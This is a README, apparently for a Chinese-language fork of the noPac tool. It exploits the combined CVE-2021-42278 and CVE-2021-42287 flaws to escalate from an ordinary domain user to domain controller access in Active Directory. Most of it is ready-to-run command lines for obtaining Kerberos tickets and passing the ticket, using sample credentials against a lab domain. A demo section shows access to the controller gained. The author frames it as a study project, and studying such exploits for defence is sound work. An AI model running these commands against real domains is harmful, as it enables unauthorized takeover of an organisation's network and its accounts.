# noPac

这个项目的由来是出于对 noPac 的原理学习, 在 [cube0x0](https://github.com/cube0x0/noPac) 的项目基础上进行了一些更改. 源码中添加了个人的理解注释.

- 删除了 Scan 功能, 个人觉得 Scan 功能用处比较鸡肋.
- 增加了 MachineAccountQuota 值的判断, 如果为 0 则退出程序.
- 优化了添加计算机帐户时的判断处理.
- 增加了 TGT 的输出.

漏洞的相关分析文章可以查看

## 利用条件

noPac 是 CVE-2021-42278 (sAMAccountName spoofing) & CVE-2021-42287 (deceiving the KDC) 两个漏洞的组合利用, 只有同时满足这两个漏洞的利用条件才能成功利用.

## 使用方法

```
Examples: Get TGT and ST

  noPac.exe /domain DomainName /dc DomainController /mAccount MachineAccount /mPassword MachineAccountPassword /user DomainUser /pass DomainUserPassword

  noPac.exe /domain missyou.com /dc dc.missyou.com /mAccount test1b$ /mPassword "TesT1b13!#@" /user wanglei /pass wanglei

  noPac.exe /domain DomainName /dc DomainController /mAccount MachineAccount /mPassword MachineAccountPassword /user DomainUser /pass DomainUserPassword /service altservice

  noPac.exe /domain missyou.com /dc dc.missyou.com /mAccount test1b$ /mPassword "TesT1b13!#@" /user wanglei /pass wanglei /service cifs

Examples: PTT

  noPac.exe /domain DomainName /dc DomainController /mAccount MachineAccount /mPassword MachineAccountPassword /user DomainUser /pass DomainUserPassword /service altservice /ptt

  noPac.exe /domain missyou.com /dc dc.missyou.com /mAccount test1b$ /mPassword "TesT1b13!#@" /user wanglei /pass wanglei /service cifs /ptt

  noPac.exe /domain missyou.com /dc dc.missyou.com /mAccount test1b /mPassword "TesT1b13!#@" /user wanglei /pass wanglei /service cifs /ptt
```

比较常用的方法是 PTT:

```PowerShell
noPac.exe /domain missyou.com /dc dc.missyou.com /mAccount test1b$ /mPassword "TesT1b13!#@" /user wanglei /pass wanglei /service cifs /ptt
```

## Demo

利用 noPac 前无权访问 DC.

![](Images/Pasted%20image%2020221222145605.png)

利用 noPac.

```PowerShell
noPac.exe /domain missyou.com /dc dc.missyou.com /mAccount test1b$ /mPassword "TesT1b13!#@" /user wanglei /pass wanglei /service cifs /ptt
```

![](Images/Pasted%20image%2020221222145709.png)

PTT 后在当前窗口再次访问 DC 即可成功访问.

![](Images/Pasted%20image%2020221222145734.png)

## 利用环境

注意程序只能运行在 .NET 4.0+ 环境的机器上, Windows Server 2012 默认带 .NET 4.0, Windows Server 2008 默认带 .NET 3.5.

查看机器上存在的 .NET 版本:

```PowerShell
dir c:\Windows\Microsoft.NET\Framework64
```

![](Images/Pasted%20image%2020221222151109.png)
